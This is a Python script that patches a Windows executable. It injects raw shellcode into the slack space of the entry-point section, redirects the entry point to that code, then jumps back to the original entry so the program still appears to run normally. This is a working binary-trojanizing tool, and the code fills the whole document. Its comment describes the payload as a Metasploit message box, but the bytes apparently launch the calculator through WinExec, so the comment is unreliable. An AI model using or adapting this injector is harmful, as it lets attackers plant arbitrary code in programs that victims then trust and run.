from pefile import PE
from struct import pack
# windows/messagebox - 265 bytes
# http://www.metasploit.com
# ICON=NO, TITLE=W00t!, EXITFUNC=process, VERBOSE=false, 
# TEXT=Debasish Wnas Here!

sample_shell_code = ( 
"\x50\x54\x58\x66\x83\xe4\xf0\x50\x31\xc0\x40\x92\x74\x50\x60" 
"\x4a\x52\x68\x63\x61\x6c\x63\x54\x59\x52\x51\x64\x8b\x72\x30" 
"\x8b\x76\x0c\x8b\x76\x0c\xad\x8b\x30\x8b\x7e\x18\x8b\x5f\x3c" 
"\x8b\x5c\x3b\x78\x8b\x74\x1f\x20\x01\xfe\x8b\x54\x1f\x24\x0f" 
"\xb7\x2c\x17\x42\x42\xad\x81\x3c\x07\x57\x69\x6e\x45\x75\xf0" 
"\x8b\x74\x1f\x1c\x01\xfe\x03\x3c\xae\xff\xd7\x58\x58\x61\x5c" 
"\x92\x58\xeb\x66\x50\x51\x53\x56\x57\x55\xb2\x60\x68\x63\x61" 
"\x6c\x63\x54\x59\x48\x29\xd4\x65\x48\x8b\x32\x48\x8b\x76\x18" 
"\x48\x8b\x76\x10\x48\xad\x48\x8b\x30\x48\x8b\x7e\x30\x03\x57" 
"\x3c\x8b\x5c\x17\x28\x8b\x74\x1f\x20\x48\x01\xfe\x8b\x54\x1f" 
"\x24\x0f\xb7\x2c\x17\x8d\x52\x02\xad\x81\x3c\x07\x57\x69\x6e" 
"\x45\x75\xef\x8b\x74\x1f\x1c\x48\x01\xfe\x8b\x34\xae\x48\x01" 
"\xf7\x99\xff\xd7\x48\x83\xc4\x68\x5d\x5f\x5e\x5b\x59\x5a\x5c" 
"\x58"
)

if __name__ == '__main__':
	import sys
	# exe_file = raw_input('[*] Enter full path of the main executable :')
	# final_pe_file = raw_input('[*] Enter full path of the output executable :')
	exe_file = sys.argv[1]
	final_pe_file = sys.argv[1]+".injected.exe"
	pe = PE(exe_file)
	OEP = pe.OPTIONAL_HEADER.AddressOfEntryPoint
	pe_sections = pe.get_section_by_rva(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
	align = pe.OPTIONAL_HEADER.SectionAlignment
	what_left = (pe_sections.VirtualAddress + pe_sections.Misc_VirtualSize) - pe.OPTIONAL_HEADER.AddressOfEntryPoint
	end_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint + what_left
	padd = align - (end_rva % align)
	e_offset = pe.get_offset_from_rva(end_rva+padd) - 1
	scode_size = len(sample_shell_code)+5
	if padd < scode_size:
		# Enough space is not available for shellcode
		exit()
	# Code can be injected
	scode_end_off = e_offset
	scode_start_off = scode_end_off - scode_size
	pe.OPTIONAL_HEADER.AddressOfEntryPoint = pe.get_rva_from_offset(scode_start_off)
	raw_pe_data = pe.write()
	jmp_to = OEP - pe.get_rva_from_offset(scode_end_off)
#	sample_shell_code = '\x41\x50%s\x41\x58\xe9%s' % (sample_shell_code, pack('I', jmp_to & 0xffffffff))
	# sample_shell_code = '\x60%s\x61\xe9%s' % (sample_shell_code, pack('I', jmp_to & 0xffffffff))
	sample_shell_code = '%s\xe9%s' % (sample_shell_code, pack('I', jmp_to & 0xffffffff))
	# sample_shell_code = '\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x50\x51\x52\x53%s\x5b\x5a\x59\x58\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\xe9%s' % (sample_shell_code, pack('I', jmp_to & 0xffffffff))
#        print "".join( '{:02x}'.format(ord(x)) for x in sample_shell_code )
	final_data = list(raw_pe_data)
	final_data[scode_start_off:scode_start_off+len(sample_shell_code)] = sample_shell_code
#	final_data = ''.join(final_data)
	final_data = bytearray(final_data)
	raw_pe_data = final_data
	pe.close()
	new_file = open(final_pe_file, 'wb')
	new_file.write(raw_pe_data)
	new_file.close()
	print '[*] Job Done! :)'
